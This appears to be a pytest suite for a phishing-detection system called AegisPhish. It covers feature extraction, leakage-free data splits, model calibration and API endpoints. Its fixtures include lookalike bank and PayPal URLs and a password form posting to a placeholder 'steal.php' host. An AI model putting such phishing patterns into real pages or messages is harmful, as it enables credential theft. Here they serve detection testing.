"""
Automated Integration and Unit Tests for AegisPhish Pipeline
Tests:
1. Feature extractor output correctness and schema conformity
2. Zero data leakage in domain-grouped splits
3. Baseline and proposed models inference and probability calibration
4. Explainability attribution integrity
5. FastAPI backend REST endpoints
"""

import pytest
import pandas as pd
import numpy as np
from fastapi.testclient import TestClient

from src.data_loader import load_dataset, get_data_splits, ALL_FEATURES, FEATURE_CATEGORIES
from src.feature_extractor import MultiModalFeatureExtractor
from src.baseline_model import BaselinePipeline
from src.proposed_model import ProposedMultiModalPipeline
from src.explainability import SecurityExplainer
from app.backend.main import app


def test_feature_extractor_schema():
    extractor = MultiModalFeatureExtractor(timeout=1.0)
    test_url = "http://chase-security-update.com.banking-auth-portal.tk/login.php"
    test_html = "<form action='http://unauth-server.ru/steal.php'><input type='password'></form><a href='http://external.com'>Link</a>"

    extracted = extractor.extract_all(test_url, html_content=test_html)
    features = extracted["features"]
    stats = extracted["continuous_stats"]

    # Verify all 30 features are present
    for f in ALL_FEATURES:
        assert f in features, f"Missing feature {f} in extractor output"
        assert features[f] in [-1, 0, 1], f"Feature {f} value {features[f]} not in valid discrete set {-1, 0, 1}"

    assert stats["entropy"] > 0
    assert stats["url_length"] == len(test_url)


def test_zero_domain_data_leakage():
    df = load_dataset()
    train_df, val_df, test_df = get_data_splits(df, test_size=0.20, val_size=0.15, group_by_domain=True, random_state=42)

    train_domains = set(train_df["domain_cluster"])
    val_domains = set(val_df["domain_cluster"])
    test_domains = set(test_df["domain_cluster"])

    # Verify 0 domain intersection
    assert len(train_domains.intersection(test_domains)) == 0, "Domain leakage between train and test!"
    assert len(train_domains.intersection(val_domains)) == 0, "Domain leakage between train and validation!"
    assert len(val_domains.intersection(test_domains)) == 0, "Domain leakage between val and test!"


def test_model_predictions_and_calibration():
    df = load_dataset()
    train_df, _, test_df = get_data_splits(df, test_size=0.20, val_size=0.15, group_by_domain=True, random_state=42)

    X_train = train_df.drop(columns=["Result", "domain_cluster"])
    y_train = train_df["Result"]
    X_test = test_df.drop(columns=["Result", "domain_cluster"])

    # Test Proposed LightGBM
    prop_model = ProposedMultiModalPipeline(model_type="lightgbm", calibrate=True, random_state=42)
    prop_model.fit(X_train, y_train)

    preds = prop_model.predict(X_test)
    probas = prop_model.predict_proba(X_test)

    assert len(preds) == len(X_test)
    assert probas.shape == (len(X_test), 2)
    # Check calibrated bounds [0, 1]
    assert np.all(probas >= 0.0) and np.all(probas <= 1.0)
    assert np.allclose(probas.sum(axis=1), 1.0)


def test_fastapi_endpoints():
    client = TestClient(app)

    # Health check
    res_health = client.get("/api/health")
    assert res_health.status_code == 200
    assert res_health.json()["status"] == "online"

    # Presets
    res_presets = client.get("/api/presets")
    assert res_presets.status_code == 200
    presets = res_presets.json()
    assert len(presets) >= 4

    # Analyze endpoint
    sample_payload = {
        "url": "http://paypal-security-check.com.unauth-domain.tk/verify-account",
        "html_content": "<form action='about:blank'><input name='password'></form><iframe style='display:none'></iframe>"
    }
    res_analyze = client.post("/api/analyze", json=sample_payload)
    assert res_analyze.status_code == 200
    body = res_analyze.json()

    assert "proposed_system" in body
    assert "baseline_system" in body
    assert "explanation" in body
    assert body["verdict"] in ["PHISHING", "SUSPICIOUS", "LEGITIMATE"]
    assert 0.0 <= body["proposed_system"]["phishing_probability"] <= 1.0
